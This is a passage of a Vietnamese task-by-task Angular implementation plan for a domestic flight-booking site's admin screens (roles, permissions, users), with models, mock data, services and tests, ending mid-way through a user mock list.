# Kế hoạch Phase 1 còn lại — FE Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Hoàn thành 11 màn Phase 1 còn lại của khu vực quản trị (RBAC, Người dùng, Sơ đồ ghế) và trang khách (Khuyến mãi, Tin tức, Voucher, Hồ sơ, Mật khẩu) trên nền mock layer, bám đúng API Design v0.2 và DB v0.4.

**Architecture:** Mỗi cụm là một nhóm màn hình độc lập, dùng lại hạ tầng đã có: `CrudPage` + `CrudConfig` cho màn CRUD, `MockResource` cho dữ liệu giả, `BaseCrudService` cho tầng gọi API. Chỉ 3 màn cần component riêng vì nghiệp vụ không biểu diễn được bằng form trường phẳng: Sơ đồ ghế (lưới ghế), Kho voucher (nút Nhận), và các màn xác thực (form dọc).

**Tech Stack:** Angular 22 (standalone, OnPush, `input()`/`output()` signal API) · Angular Material 22 · Tailwind 3.4 · Vitest 4 · SCSS token tại `src/_tokens.scss`

**Spec:** Không có spec riêng cho đợt này. Nguồn chân lý là:
- `domestic-flight-booking-web-be/docs/API_Design_Website_Dat_Ve_May_Bay_v0.2.md` — hợp đồng API
- `domestic-flight-booking-web-be/docs/Database_Design_Domestic_Flight_Booking_v0.4.docx` — schema (đã đọc; xem mục "Ràng buộc dữ liệu đã xác nhận" bên dưới)
- `docs/design/mockup-6-khuon.html` — nguồn chân lý thị giác
- `domestic-flight-booking-web-be/docs/Danh_sach_toan_bo_UI_Website_Dat_Ve_May_Bay_Noi_Dia.docx` — danh sách 76 màn

## Global Constraints

- **Angular 22 standalone** — không NgModule. Component khai `imports: [...]`.
- **`ChangeDetectionStrategy.OnPush`** trên mọi component.
- **Tách `.html`/`.css` khỏi `.ts`** — không viết template/style inline (trừ component rất ngắn như `StatusBadge`).
- **Path alias** `@core/@shared/@features/@env`; **`templateUrl`/`styleUrl` phải giữ đường dẫn tương đối** (`./x.html`) — đổi sang alias làm build đổ `NG2008`.
- **`snake_case`** cho mọi field model và payload, khớp API v0.2.
- **Envelope** `{code, message, data}`; danh sách là `{items, pagination}`.
- **Xóa mềm**: `is_deleted = true`, không xóa bản ghi. Toggle dùng `is_active`.
- **Comment tiếng Việt, giải thích LÝ DO** — không mô tả lại code.
- **Không hard-code mã màu** — dùng token trong `src/_tokens.scss`.
- **Không dùng emoji làm icon** — chỉ Material Icons.
- **Khu vực admin phải có sidebar + header breadcrumb + footer** (đã có ở `admin-layout`).
- **Ngôn ngữ giao diện: tiếng Việt.**
- **Kiểm chứng mỗi cụm**: `npx ng build` xanh · `npx ng test --watch=false` pass · đo trên trình duyệt thật (không iframe ẩn) tại 1440px và 375px, `overflow` ngang = 0.

## Ràng buộc dữ liệu đã xác nhận (đọc từ DB v0.4)

Ghi lại đây vì kế hoạch dựa vào chúng; **khác với những gì code FE hiện giả định**:

| Sự thật | Ảnh hưởng |
|---|---|
| `users.role_id BIGINT NOT NULL FK → roles.id` — **một user một role** | API v0.2 ghi `roles: ["STAFF"]` (mảng). FE gửi mảng 1 phần tử; không thiết kế UI chọn nhiều role. |
| Bảng `permissions` **không có cột `module`** | API v0.2 mục 2.4 trả `module` và cho filter theo nó → **mâu thuẫn, phải hỏi Bình**. Cụm 1 vẫn làm theo API (có `module`), ghi chú lại. |
| `user_vouchers.status` ∈ `AVAILABLE \| RESERVED \| USED \| EXPIRED` | Màn "Voucher của tôi" phải hiện đủ 4 trạng thái. |
| `user_vouchers.source` ∈ `CLAIMED \| GIFTED` | Hiển thị nguồn gốc voucher. |
| `aircraft_seats` khoá UNIQUE `(aircraft_id, seat_row, seat_column)` | Sơ đồ ghế không được có 2 ghế trùng hàng+cột. |
| `promotions`/`vouchers` **chưa có** cột `image_url`/`description`/`badge_label` | Đã có đề xuất riêng ở `be/docs/De_xuat_bo_sung_DB_v0.5_truong_anh.md`. Cụm 4 dùng dữ liệu mock, chờ BE. |
| Tổng số ghế phải **khớp chính xác** `aircrafts.seat_capacity` | Sơ đồ ghế chặn Lưu khi lệch. |

## Review Focus

Năm lớp đầu vào mà spec không nói tới nhưng rất dễ làm hỏng phần mềm — mỗi dòng đã được gắn test ở cụm sở hữu code:

1. **Nội dung News là HTML từ ADMIN** — render thẳng `[innerHTML]` là lỗ hổng XSS. Người dùng hợp lý mong thẻ `<script>`/`onerror` bị loại bỏ. → test ở Cụm 4.
2. **ADMIN tự hạ quyền chính mình khi là ADMIN ACTIVE cuối cùng** — API trả `1006`; nếu FE không chặn trước thì ADMIN tự khoá mình khỏi hệ thống. → test ở Cụm 2.
3. **Sơ đồ ghế lệch `seat_capacity`** — lưu được sẽ làm hỏng dữ liệu chuyến bay về sau. → test ở Cụm 3.
4. **Khách bấm Nhận voucher đã hết lượt / đã nhận** — API trả `1006`/`1005`; FE phải hiện đúng nút (Đã nhận / Hết lượt) thay vì để khách bấm rồi báo lỗi. → test ở Cụm 5.
5. **Mã hoá mật khẩu ở luồng đặt lại** — `new_password` quá ngắn hoặc `confirm` không khớp; API chỉ trả `1006` chung chung. → test ở Cụm 6.

---

# CỤM 1 — RBAC: Vai trò & Quyền (chỉ đọc)

Hai màn chỉ đọc vì BR-RBAC-03 cấm CRUD role và Permission Matrix v2.0 không định nghĩa CRUD permission. Cả hai dùng `CrudPage` với `readonly: true` — không cần component mới.

### Task 1.1: Model Role & Permission + service

**Files:**
- Create: `src/app/core/models/rbac.model.ts`
- Modify: `src/app/core/services/catalog.service.ts`
- Modify: `src/app/core/mock/data/catalog.mock.ts`
- Modify: `src/app/core/mock/mock-registry.ts`
- Test: `src/app/core/mock/mock-registry.spec.ts`

**Interfaces:**
- Consumes: không (task đầu).
- Produces: `Role`, `Permission` (từ `@core/models/rbac.model`), `RoleService`, `PermissionService` (từ `@core/services/catalog.service`), `ROLES_MOCK`, `PERMISSIONS_MOCK` (từ `@core/mock/data/catalog.mock`).

- [ ] **Step 1: Viết model**

Tạo `src/app/core/models/rbac.model.ts`:

```ts
/**
 * Role & Permission — API v0.2 mục 2.4, bảng roles/permissions (DB v0.4).
 *
 * Cả hai CHỈ ĐỌC ở MVP: BR-RBAC-03 quy định role cố định (CUSTOMER/STAFF/ADMIN),
 * Permission Matrix v2.0 không định nghĩa quyền tạo/sửa/xóa cho role và permission.
 * Vì vậy không có `...Payload` — không bao giờ gửi lên.
 */

/** Vai trò — chỉ có 3 giá trị, seed sẵn trong DB. */
export interface Role {
  id: number;
  name: 'CUSTOMER' | 'STAFF' | 'ADMIN';
  description: string | null;
}

/**
 * Quyền — catalog seed sẵn, chỉ đọc.
 *
 * LƯU Ý: API v0.2 mục 2.4 trả và lọc theo `module`, nhưng bảng `permissions`
 * trong DB v0.4 KHÔNG có cột `module` (chỉ có id, permission_key, description).
 * Đã nêu trong phần câu hỏi cho BE — tạm làm theo API vì đó là hợp đồng FE đọc.
 */
export interface Permission {
  id: number;
  permission_key: string;
  description: string | null;
  module: string | null;
}
```

- [ ] **Step 2: Thêm mock data**

Thêm vào cuối `src/app/core/mock/data/catalog.mock.ts` (nhớ thêm import `Permission, Role` vào dòng import đầu file):

```ts
/** Vai trò — API v0.2 mục 2.4. Seed cố định, không CRUD. */
export const ROLES_MOCK: Role[] = [
  { id: 1, name: 'CUSTOMER', description: 'Khách hàng đã đăng ký/đăng nhập — nghiệp vụ cá nhân và booking' },
  { id: 2, name: 'STAFF', description: 'Nhân viên vận hành — quản lý flight, fare, seat, booking' },
  { id: 3, name: 'ADMIN', description: 'Quản trị hệ thống — user, RBAC, master data, content' },
];

/**
 * Quyền — trích từ `V2__seed_rbac.sql` của BE để FE thấy đúng dữ liệu thật.
 * Chỉ lấy một phần đủ để thử lọc theo `module`; đủ 7 module khác nhau.
 */
export const PERMISSIONS_MOCK: Permission[] = [
  { id: 1, permission_key: 'LOGIN', description: 'Đăng nhập hệ thống', module: 'AUTH' },
  { id: 2, permission_key: 'LOGOUT', description: 'Đăng xuất', module: 'AUTH' },
  { id: 3, permission_key: 'PASSWORD_CHANGE_SELF', description: 'Đổi mật khẩu của mình', module: 'AUTH' },
  { id: 4, permission_key: 'USER_READ', description: 'Xem danh sách người dùng', module: 'USER' },
  { id: 5, permission_key: 'USER_READ_DETAIL', description: 'Xem chi tiết người dùng', module: 'USER' },
  { id: 6, permission_key: 'USER_CREATE', description: 'Tạo người dùng', module: 'USER' },
  { id: 7, permission_key: 'USER_UPDATE', description: 'Cập nhật người dùng', module: 'USER' },
  { id: 8, permission_key: 'USER_DELETE', description: 'Xóa người dùng', module: 'USER' },
  { id: 9, permission_key: 'ROLE_READ', description: 'Xem vai trò và quyền', module: 'ROLE' },
  { id: 10, permission_key: 'AIRLINE_READ', description: 'Xem danh sách hãng hàng không', module: 'AIRLINE' },
  { id: 11, permission_key: 'AIRLINE_CREATE', description: 'Tạo hãng hàng không', module: 'AIRLINE' },
  { id: 12, permission_key: 'CITY_READ', description: 'Xem danh sách thành phố', module: 'CITY' },
  { id: 13, permission_key: 'AIRPORT_READ', description: 'Xem danh sách sân bay', module: 'AIRPORT' },
  { id: 14, permission_key: 'AIRCRAFT_READ', description: 'Xem danh sách máy bay', module: 'AIRCRAFT' },
  { id: 15, permission_key: 'SEAT_CONFIG_READ', description: 'Xem danh sách cấu hình ghế', module: 'SEAT_CONFIG' },
  { id: 16, permission_key: 'SEAT_CONFIG_UPDATE', description: 'Cập nhật cấu hình ghế', module: 'SEAT_CONFIG' },
  { id: 17, permission_key: 'PROMOTION_READ', description: 'Xem danh sách khuyến mãi', module: 'PROMOTION' },
  { id: 18, permission_key: 'VOUCHER_READ', description: 'Xem danh sách voucher', module: 'VOUCHER' },
  { id: 19, permission_key: 'VOUCHER_CLAIM', description: 'Nhận voucher vào ví', module: 'VOUCHER' },
  { id: 20, permission_key: 'NEWS_READ', description: 'Xem danh sách tin tức', module: 'NEWS' },
  { id: 21, permission_key: 'NEWS_PUBLISH', description: 'Xuất bản tin tức', module: 'NEWS' },
];
```

- [ ] **Step 3: Thêm service**

Thêm vào `src/app/core/services/catalog.service.ts` (thêm `Permission, Role` vào import model):

```ts
/**
 * Vai trò và quyền — CHỈ ĐỌC.
 *
 * Vì sao vẫn kế thừa `BaseCrudService` dù không dùng create/update/remove:
 * `CrudPage` khai `service = input.required<BaseCrudService<T, P>>()`, nên service
 * đưa vào bắt buộc phải là lớp con của nó. Không gọi tới các method ghi ở đâu cả —
 * việc chặn ghi nằm ở `readonly: true` của `CrudConfig` (ẩn mọi nút thêm/sửa/xóa).
 */
@Injectable({ providedIn: 'root' })
export class RoleService extends BaseCrudService<Role> {
  constructor() {
    super('roles');
  }

  /**
   * BR-LIST-05: role trả MẢNG TRẦN, không phân trang.
   *
   * Khai đè kiểu trả về để `CrudPage` biết đây không phải `PageData`. API v0.2
   * mục 2.4 KHÔNG định nghĩa `keyword` cho role, nên `list()` bỏ qua tham số
   * truyền vào — xem ghi chú về ô tìm kiếm ở màn Vai trò.
   */
  override list(): Observable<ApiResponse<Role[]>> {
    return this.http.get<ApiResponse<Role[]>>(this.baseUrl);
  }
}

@Injectable({ providedIn: 'root' })
export class PermissionService extends BaseCrudService<Permission> {
  constructor() {
    super('permissions');
  }

  /** Có search/filter/sort theo BR-LIST-05, nhưng trả mảng trần (không phân trang). */
  override list(query: ListQuery = {}): Observable<ApiResponse<Permission[]>> {
    let params = new HttpParams();
    for (const [key, value] of Object.entries(query)) {
      if (value !== undefined && value !== null && value !== '') {
        params = params.set(key, String(value));
      }
    }
    return this.http.get<ApiResponse<Permission[]>>(this.baseUrl, { params });
  }
}
```

Thêm import cần thiết vào đầu `catalog.service.ts`:

```ts
import { HttpClient, HttpParams } from '@angular/common/http';
import { inject, Injectable } from '@angular/core';
import { Observable } from 'rxjs';
import { environment } from '@env/environment';
import { ApiResponse, ListQuery } from '@core/models/api-response.model';
import { Permission, Role } from '@core/models/rbac.model';
```

**Ghi chú về kiểu generic:** `BaseCrudService<T, P = Partial<T>>` nên `BaseCrudService<Role>` cho `P = Partial<Role>`. `CrudPage<Role, never>` ở màn tương ứng vẫn khớp vì `readonly` nên form không bao giờ dùng `P` — nhưng để tránh lệch kiểu khi build, khai `CrudPage` với `Partial<Role>` ở Task 1.2.


- [ ] **Step 4: Đăng ký mock handler**

Thêm vào `src/app/core/mock/mock-registry.ts` — chèn NGAY TRƯỚC vòng lặp `for (const resource of this.resources)` trong `resolve()`:

```ts
    // RBAC chỉ đọc — trả mảng trần, không phân trang (BR-LIST-05).
    if (path === '/api/v1/roles' && m === 'GET') {
      return ok(ROLES_MOCK);
    }
    if (path === '/api/v1/permissions' && m === 'GET') {
      return this.listPermissions(url);
    }
```

Thêm method vào class `MockRegistry`:

```ts
  /**
   * Quyền — lọc theo `keyword` (permission_key hoặc description) và `module`,
   * đúng whitelist API v0.2 mục 2.4. Trả mảng trần, không phân trang.
   */
  private listPermissions(url: string): unknown {
    const params = readParams(url);
    const keyword = (params.get('keyword') ?? '').trim().toLowerCase();
    const module = params.get('module') ?? '';

    let rows = PERMISSIONS_MOCK;
    if (keyword) {
      rows = rows.filter(
        (p) =>
          p.permission_key.toLowerCase().includes(keyword) ||
          (p.description ?? '').toLowerCase().includes(keyword),
      );
    }
    if (module) {
      rows = rows.filter((p) => p.module === module);
    }
    return ok(rows);
  }
```

Thêm `PERMISSIONS_MOCK, ROLES_MOCK` vào import từ `@core/mock/data/catalog.mock`.

- [ ] **Step 5: Viết test**

Thêm vào `src/app/core/mock/mock-registry.spec.ts`:

```ts
describe('RBAC mock (chỉ đọc)', () => {
  it('GET /roles trả mảng trần đúng 3 role cố định', () => {
    const registry = new MockRegistry();
    const res = registry.resolve('GET', 'http://x/api/v1/roles') as ApiResponse<Role[]>;

    expect(res.code).toBe(1000);
    expect(Array.isArray(res.data)).toBe(true);
    expect(res.data).toHaveLength(3);
    expect(res.data.map((r) => r.name)).toEqual(['CUSTOMER', 'STAFF', 'ADMIN']);
  });

  it('GET /permissions lọc được theo module', () => {
    const registry = new MockRegistry();
    const res = registry.resolve(
      'GET',
      'http://x/api/v1/permissions?module=USER',
    ) as ApiResponse<Permission[]>;

    expect(res.data.length).toBeGreaterThan(0);
    // Mọi dòng trả về phải thuộc đúng module đã lọc — không lọt dòng module khác.
    expect(res.data.every((p) => p.module === 'USER')).toBe(true);
  });

  it('GET /permissions tìm được theo keyword trong description', () => {
    const registry = new MockRegistry();
    const res = registry.resolve(
      'GET',
      'http://x/api/v1/permissions?keyword=xu%E1%BA%A5t%20b%E1%BA%A3n',
    ) as ApiResponse<Permission[]>;

    expect(res.data.map((p) => p.permission_key)).toContain('NEWS_PUBLISH');
  });
});
```

Thêm import `ApiResponse` từ `@core/models/api-response.model`, `Permission, Role` từ `@core/models/rbac.model` vào đầu file spec nếu chưa có.

- [ ] **Step 6: Chạy test — phải FAIL trước khi có handler**

Run: `npx ng test --watch=false`
Expected: FAIL — `resolve('GET', '.../roles')` trả `undefined` nên `res.code` ném TypeError.

- [ ] **Step 7: Chạy lại test — phải PASS**

Run: `npx ng test --watch=false`
Expected: PASS toàn bộ, gồm 3 test mới.

- [ ] **Step 8: Commit**

```bash
git add src/app/core/models/rbac.model.ts src/app/core/services/catalog.service.ts \
  src/app/core/mock/data/catalog.mock.ts src/app/core/mock/mock-registry.ts \
  src/app/core/mock/mock-registry.spec.ts
git commit -m "feat(rbac): model + service chỉ đọc cho Role và Permission"
```

### Task 1.2: Hai màn Vai trò & Quyền

**Files:**
- Create: `src/app/features/admin/pages/roles/roles.ts`
- Create: `src/app/features/admin/pages/permissions/permissions.ts`
- Modify: `src/app/app.routes.ts`
- Test: `src/app/features/admin/pages/permissions/permissions.spec.ts`

**Interfaces:**
- Consumes: `RoleService`, `PermissionService`, `Role`, `Permission` từ Task 1.1.
- Produces: `AdminRoles`, `AdminPermissions` (component), route `/admin/roles`, `/admin/permissions`.

- [ ] **Step 1: Viết màn Vai trò**

Tạo `src/app/features/admin/pages/roles/roles.ts`:

```ts
import { ChangeDetectionStrategy, Component, inject } from '@angular/core';
import { Role } from '@core/models/rbac.model';
import { RoleService } from '@core/services/catalog.service';
import { CrudConfig } from '@shared/crud/crud-config';
import { CrudPage } from '@shared/crud/crud-page';

/**
 * Vai trò — RBAC-01 (API v0.2 mục 2.4). CHỈ ĐỌC.
 *
 * Vì sao không có nút thêm/sửa/xóa: BR-RBAC-03 chốt role cố định
 * CUSTOMER/STAFF/ADMIN, ADMIN không tạo role mới. Màn này để tra cứu role nào
 * có mô tả gì, không phải để quản lý.
 */
@Component({
  selector: 'app-admin-roles',
  changeDetection: ChangeDetectionStrategy.OnPush,
  imports: [CrudPage],
  template: `<app-crud-page [config]="config" [service]="service" />`,
})
export class AdminRoles {
  protected readonly service = inject(RoleService);

  protected readonly config: CrudConfig<Role, Partial<Role>> = {
    readonly: true,
    title: 'Vai trò',
    subtitle: 'Ba vai trò cố định của hệ thống — không sửa được (BR-RBAC-03)',
    createLabel: '',
    // Rỗng để `CrudPage` ẩn luôn thanh công cụ — xem Step 5. API v0.2 mục 2.4
    // KHÔNG định nghĩa `keyword` cho role nên ô tìm kiếm sẽ là ô chết.
    searchPlaceholder: '',
    emptyIcon: 'admin_panel_settings',
    emptyMessage: 'Chưa có vai trò',
    emptyHint: '',
    editTitle: '',
    deleteTitle: () => '',
    deleteMessage: () => '',
    columns: [
      {
        label: 'Vai trò',
        value: (r) => r.name,
        tone: (r) => (r.name === 'ADMIN' ? 'danger' : r.name === 'STAFF' ? 'info' : 'neutral'),
        width: '160px',
      },
      { label: 'Mô tả', value: (r) => r.description ?? '—' },
    ],
    fields: [],
  };
}
```

- [ ] **Step 2: Viết màn Quyền**

Tạo `src/app/features/admin/pages/permissions/permissions.ts`:

```ts
import { ChangeDetectionStrategy, Component, inject } from '@angular/core';
import { Permission } from '@core/models/rbac.model';
import { PermissionService } from '@core/services/catalog.service';
import { CrudConfig } from '@shared/crud/crud-config';
import { CrudPage } from '@shared/crud/crud-page';

/** Danh sách module để lọc — lấy từ `permissions.module` (API v0.2 mục 2.4). */
const MODULES = [
  'AUTH', 'USER', 'ROLE', 'AIRLINE', 'CITY', 'AIRPORT', 'AIRCRAFT',
  'SEAT_CONFIG', 'PROMOTION', 'VOUCHER', 'NEWS', 'FLIGHT', 'FARE_CLASS',
  'BOOKING', 'PAYMENT',
];

/**
 * Quyền — RBAC-02 (API v0.2 mục 2.4). CHỈ ĐỌC.
 *
 * Permission Matrix v2.0 không định nghĩa CRUD permission: catalog này seed
 * sẵn và chỉ để tra cứu key nào tồn tại. Bộ lọc theo `module` là công cụ chính
 * — có hơn 60 key, không lọc thì không tìm nổi.
 */
@Component({
  selector: 'app-admin-permissions',
  changeDetection: ChangeDetectionStrategy.OnPush,
  imports: [CrudPage],
  template: `<app-crud-page [config]="config" [service]="service" />`,
})
export class AdminPermissions {
  protected readonly service = inject(PermissionService);

  protected readonly config: CrudConfig<Permission, Partial<Permission>> = {
    readonly: true,
    title: 'Quyền',
    subtitle: 'Danh mục quyền của hệ thống — chỉ đọc, lọc theo nhóm chức năng',
    createLabel: '',
    searchPlaceholder: 'Tìm theo mã quyền hoặc mô tả',
    emptyIcon: 'vpn_key',
    emptyMessage: 'Chưa có quyền',
    emptyHint: '',
    editTitle: '',
    deleteTitle: () => '',
    deleteMessage: () => '',
    columns: [
      { label: 'Mã quyền', value: (r) => r.permission_key, kind: 'code', width: '230px' },
      { label: 'Nhóm', value: (r) => r.module ?? '—', width: '140px' },
      { label: 'Mô tả', value: (r) => r.description ?? '—' },
    ],
    fields: [],
    filters: [
      {
        key: 'module',
        label: 'Lọc theo nhóm',
        defaultValue: '',
        options: [
          { value: '', label: 'Tất cả nhóm' },
          ...MODULES.map((mod) => ({ value: mod, label: mod })),
        ],
      },
    ],
  };
}
```

- [ ] **Step 3: Viết test tích hợp**

Tạo `src/app/features/admin/pages/permissions/permissions.spec.ts`:

```ts
import { provideHttpClient, withInterceptors } from '@angular/common/http';
import { TestBed } from '@angular/core/testing';
import { provideRouter } from '@angular/router';
import { MockRegistry } from '@core/mock/mock-registry';
import { mockInterceptor } from '@core/mock/mock.interceptor';
import { AdminPermissions } from '@features/admin/pages/permissions/permissions';

/**
 * Kiểm chứng chuỗi component → service → interceptor cho màn chỉ đọc.
 * Đây là chỗ dễ đứt nhất: `RoleService`/`PermissionService` KHÔNG kế thừa
 * `BaseCrudService` nên trả MẢNG TRẦN, không phải `{items, pagination}` —
 * nếu `CrudPage` giả định sai shape thì bảng rỗng mà không báo lỗi.
 */
describe('AdminPermissions (tích hợp mock)', () => {
  beforeEach(async () => {
    await TestBed.configureTestingModule({
      imports: [AdminPermissions],
      providers: [
        provideRouter([]),
        MockRegistry,
        provideHttpClient(withInterceptors([mockInterceptor])),
      ],
    }).compileComponents();
  });

  it('render được mảng trần (không phân trang) thành bảng', async () => {
    const fixture = TestBed.createComponent(AdminPermissions);
    fixture.detectChanges();
    await new Promise((r) => setTimeout(r, 600));
    fixture.detectChanges();

    const el = fixture.nativeElement as HTMLElement;
    const text = el.textContent ?? '';
    expect(text).toContain('USER_READ');
    expect(text).toContain('VOUCHER_CLAIM');
  });

  it('màn chỉ đọc KHÔNG render nút thêm mới', async () => {
    const fixture = TestBed.createComponent(AdminPermissions);
    fixture.detectChanges();
    await new Promise((r) => setTimeout(r, 600));
    fixture.detectChanges();

    const el = fixture.nativeElement as HTMLElement;
    // Không có nút "Thêm" nào — BR-RBAC-03.
    const buttons = Array.from(el.querySelectorAll('button')).map((b) => b.textContent?.trim() ?? '');
    expect(buttons.some((b) => b.startsWith('Thêm'))).toBe(false);
  });
});
```

- [ ] **Step 4: Chạy test — PASS**

Run: `npx ng test --watch=false`
Expected: PASS. Nếu FAIL ở `CrudPage` vì shape mảng trần, xem Step 5.

- [ ] **Step 5: Sửa `CrudPage` để nhận cả mảng trần**

`CrudPage.load()` (khoảng dòng 255–268 của `src/app/shared/crud/crud-page.ts`) đang giả định `res.data` là `PageData<T>`. Với role/permission, `data` là **mảng trần** (BR-LIST-05). Sửa khối `.subscribe({ next: ... })` thành:

```ts
    this.service()
      .list(query)
      .subscribe({
        next: (res) => {
          // BR-LIST-05: role và permission trả MẢNG TRẦN (không phân trang), các
          // module khác trả {items, pagination}. Nhận cả hai để dùng chung một
          // component thay vì viết màn riêng cho 2 trường hợp.
          const payload = res.data as unknown;
          if (Array.isArray(payload)) {
            this.rows.set(payload as T[]);
            this.totalItems.set(payload.length);
          } else {
            const page = payload as PageData<T>;
            this.rows.set(page.items);
            this.totalItems.set(page.pagination.total_items);
          }
          this.loading.set(false);
        },
        error: (err: Error) => {
          this.notify(err.message);
          this.loading.set(false);
        },
      });
```

Thêm import nếu chưa có: `import { PageData } from '@core/models/api-response.model';`

**Cũng sửa template để ẩn ô tìm kiếm khi `searchPlaceholder` rỗng** — role không hỗ trợ `keyword`, để lại ô chết là gây hiểu nhầm. Trong `src/app/shared/crud/crud-page.html`, tìm khối `<div class="search">` (khoảng dòng 20–31) và bọc lại:

```html
        @if (config().searchPlaceholder) {
          <div class="search">
            <mat-icon>search</mat-icon>
            <input
              type="search"
              [placeholder]="config().searchPlaceholder"
              [attr.aria-label]="config().searchPlaceholder"
              [ngModel]="keyword()"
              (ngModelChange)="onKeyword($event)"
            />
          </div>
        }
```

**Lưu ý:** điều kiện `hasFilters()` hiện dựa trên `keyword().trim().length > 0` — với role, keyword luôn rỗng nên nhánh này tự đúng, không cần sửa thêm.


- [ ] **Step 6: Chạy lại test — PASS**

Run: `npx ng test --watch=false`
Expected: PASS.

- [ ] **Step 7: Thêm route**

Trong `src/app/app.routes.ts`, **xóa** hai dòng `...comingSoonAdmin('roles', 'Vai trò', true),` và `...comingSoonAdmin('permissions', 'Quyền', true),` rồi thêm vào khối admin:

```ts
      {
        path: 'roles',
        canActivate: [adminGuard],
        loadComponent: () =>
          import('@features/admin/pages/roles/roles').then((m) => m.AdminRoles),
        data: { title: 'Vai trò' },
      },
      {
        path: 'permissions',
        canActivate: [adminGuard],
        loadComponent: () =>
          import('@features/admin/pages/permissions/permissions').then((m) => m.AdminPermissions),
        data: { title: 'Quyền' },
      },
```

- [ ] **Step 8: Build + kiểm chứng trên trình duyệt**

Run: `npx ng build`
Expected: build xanh.

Chạy `npx ng serve`, đăng nhập `admin@demo.local` / `12345678`, mở `/admin/roles` và `/admin/permissions`:
- `/admin/roles`: 3 dòng CUSTOMER/STAFF/ADMIN, nhãn màu khác nhau, **không** có nút Thêm/Sửa/Xóa.
- `/admin/permissions`: 21 dòng, lọc `module=USER` còn đúng 5 dòng, không tràn ngang ở 375px.

- [ ] **Step 9: Commit**

```bash
git add src/app/features/admin/pages/roles/ src/app/features/admin/pages/permissions/ \
  src/app/shared/crud/crud-page.ts src/app/app.routes.ts
git commit -m "feat(rbac): màn Vai trò và Quyền chỉ đọc"
```

---

# CỤM 2 — Người dùng

CRUD đầy đủ + đổi role + toggle trạng thái + đặt lại mật khẩu. Cần form riêng vì có hai hành động không nằm trong form trường phẳng: **đặt lại mật khẩu** (trả mật khẩu tạm, không phải ô nhập) và **chặn tự hạ quyền** (ràng buộc liên bản ghi).

### Task 2.1: Model User + service + mock

**Files:**
- Modify: `src/app/core/models/auth.model.ts`
- Modify: `src/app/core/services/catalog.service.ts`
- Modify: `src/app/core/mock/data/auth.mock.ts`
- Modify: `src/app/core/mock/mock-registry.ts`
- Test: `src/app/core/mock/mock-registry.spec.ts`

**Interfaces:**
- Consumes: `Role` từ Cụm 1; `RoleService` để lấy danh sách role cho dropdown.
- Produces: `AdminUser`, `AdminUserPayload`; `UserService` (từ `@core/services/catalog.service`); `USERS_MOCK` (từ `@core/mock/data/auth.mock`).

- [ ] **Step 1: Thêm model**

Thêm vào `src/app/core/models/auth.model.ts`:

```ts
/**
 * Người dùng ở góc nhìn ADMIN — API v0.2 mục 2.3.
 *
 * Khác `User` ở chỗ có `is_active`/`is_deleted` (DB v0.4 tách hai cờ) và
 * `created_at` bắt buộc (màn danh sách hiện ngày tạo).
 *
 * VỀ `roles`: DB v0.4 dùng `users.role_id BIGINT NOT NULL` — MỘT user MỘT role.
 * API v0.2 vẫn ghi `roles` dạng MẢNG nên FE gửi mảng đúng 1 phần tử và không
 * thiết kế UI chọn nhiều role. Nếu BE chốt đổi sang `role` (số ít) thì sửa ở
 * đây và ở `AdminUserPayload`.
 */
export interface AdminUser {
  id: number;
  email: string;
  full_name: string;
  phone: string | null;
  avatar_url: string | null;
  is_active: boolean;
  is_deleted: boolean;
  roles: RoleName[];
  created_at: string;
  updated_at: string;
}

/** Payload POST /users — ADMIN chọn role ngay khi tạo (BR-RBAC-02). */
export interface AdminUserCreatePayload {
  email: string;
  password: string;
  full_name: string;
  phone: string | null;
  is_active: boolean;
  roles: RoleName[];
}

/**
 * Payload PUT /users/{id} — KHÔNG có `password`.
 * Đặt lại mật khẩu là endpoint riêng (`POST /users/{id}/reset-password`) vì
 * trả về mật khẩu tạm, không phải nhận mật khẩu mới từ ADMIN.
 */
export interface AdminUserUpdatePayload {
  full_name: string;
  phone: string | null;
  is_active: boolean;
  roles: RoleName[];
}
```

- [ ] **Step 2: Thêm service**

Thêm vào `src/app/core/services/catalog.service.ts`:

```ts
/**
 * Người dùng (ADMIN) — API v0.2 mục 2.3.
 *
 * Hai thao tác không nằm trong CRUD chuẩn nên viết riêng:
 * `resetPassword` trả mật khẩu tạm (khác PUT vốn không nhận password), và
 * `remove` ở đây là xóa MỀM (đặt is_active = false, giữ dữ liệu lịch sử).
 */
@Injectable({ providedIn: 'root' })
export class UserService extends BaseCrudService<AdminUser, AdminUserUpdatePayload> {
  constructor() {
    super('users');
  }

  create(payload: AdminUserCreatePayload): Observable<ApiResponse<AdminUser>> {
    return this.http.post<ApiResponse<AdminUser>>(this.baseUrl, payload);
  }

  /** ADMIN đặt lại mật khẩu → Backend trả mật khẩu tạm để đưa cho nhân viên. */
  resetPassword(id: number): Observable<ApiResponse<{ temporary_password: string }>> {
    return this.http.post<ApiResponse<{ temporary_password: string }>>(
      `${this.baseUrl}/${id}/reset-password`,
      {},
    );
  }
}
```

Thêm `AdminUser, AdminUserCreatePayload, AdminUserUpdatePayload` vào import từ `@core/models/auth.model`.

- [ ] **Step 3: Thêm mock data**

Thêm vào cuối `src/app/core/mock/data/auth.mock.ts`:

```ts
/**
 * Người dùng cho màn quản trị — API v0.2 mục 2.3.
 *
 * Cố ý có đủ các ca khó để thử giao diện: ADMIN đang hoạt động (để thử chặn tự
 * hạ quyền), một tài khoản INACTIVE, một CUSTOMER, và một bản ghi đã xóa mềm
 * (không được lộ ra danh sách).
 */
export const USERS_MOCK: AdminUser[] = [
  {
    id: 1, email: 'admin@demo.local', full_name: 'Quản trị viên', phone: '0901234567',
    avatar_url: null, is_active: true, is_deleted: false, roles: ['ADMIN'],
    created_at: '2026-01-05T02:00:00Z', updated_at: '2026-09-20T03:00:00Z',
  },
  {
    id: 2, email: 'staff@demo.local', full_name: 'Nhân viên vận hành', phone: '0912345678',
    avatar_url: null, is_active: true, is_deleted: false, roles: ['STAFF'],
    created_at: '2026-02-11T02:00:00Z', updated_at: '2026-09-18T03:00:00Z',
  },
  {
    id: 3, email: 'staff02@demo.local', full_name: 'Trần Đức Anh', phone: '0987654321',
    avatar_url: null, is_active: false, is_deleted: false, roles: ['STAFF'],
    created_at: '2026-03-02T02:00:00Z', updated_at: '2026-08-30T03:00:00Z',
  },
  {
    id: 10, email: 'customer@demo.local', full_name: 'Khách hàng', phone: null,
    avatar_url: null, is_active: true, is_deleted: false, roles: ['CUSTOMER'],
    created_at: '2026-04-15T02:00:00Z', updated_at: '2026-09-01T03:00:00Z',
  },
  {
